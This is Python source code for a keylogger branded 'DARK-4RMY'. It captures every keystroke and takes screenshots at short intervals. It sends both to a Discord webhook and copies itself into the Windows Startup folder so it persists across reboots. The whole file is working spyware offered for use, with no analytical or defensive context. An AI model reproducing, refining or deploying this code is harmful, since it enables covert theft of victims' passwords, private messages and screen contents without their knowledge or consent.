from threading import Timer
from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput.keyboard import Listener
import pyautogui
from io import BytesIO
import threading
import os
import shutil
import sys

WEBHOOK = ""

class DARK4RMY:
    def __init__(self, interval=1.5, screenshot_interval=1.5):
        self.log = ""
        self.timer = None
        self.screenshot_timer = None
        self.interval = interval
        self.screenshot_interval = screenshot_interval

    def send(self, screenshot_data=None):
        if not self.log:
            return

        webhook = DiscordWebhook(url=WEBHOOK, username="DARK-4RMY", avatar_url="https://abagond.wordpress.com/wp-content/uploads/2020/07/dark-army.png")
        embed = DiscordEmbed(title="", description="[DARK-4RMY](https://rvlt.gg/8ez9akZK)", color="FFFFFE")
        embed.set_image(url="https://mir-s3-cdn-cf.behance.net/project_modules/disp/33779762328391.5a8cb66e6f1c5.png")
        embed.add_embed_field(name="", value=f"```{self.log}```", inline=False)
        webhook.add_embed(embed)

        if screenshot_data:
            webhook.add_file(file=screenshot_data, filename="screenshot.jpg")

        webhook.execute()
        self.log = ""

    def timer_log(self):
        if self.timer:
            self.timer.cancel()
        self.timer = Timer(self.interval, self.send_log)
        self.timer.start()

    def send_log(self):
        screenshot_data = self.screenshot()
        self.send(screenshot_data=screenshot_data)

    def key(self, key):
        self.log += key.char if hasattr(key, 'char') and key.char else f" [{key}] "
        self.timer_log()

    def screenshot(self):
        byte = BytesIO()
        pyautogui.screenshot().convert('RGB').save(byte, format='JPEG')
        byte.seek(0)
        return byte

    def listen(self):
        listener = Listener(on_press=self.key)
        listener.start()
        listener.join()

    def startup(self):
        startup = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        path = sys.argv[0]
        dest = os.path.join(startup, os.path.basename(path))
        if not os.path.exists(dest):
            shutil.copyfile(path, dest)

    def main(self):
        self.startup()
        keylogger_thread = threading.Thread(target=self.listen)
        keylogger_thread.start()
        keylogger_thread.join()

logger = DARK4RMY()
logger.main()
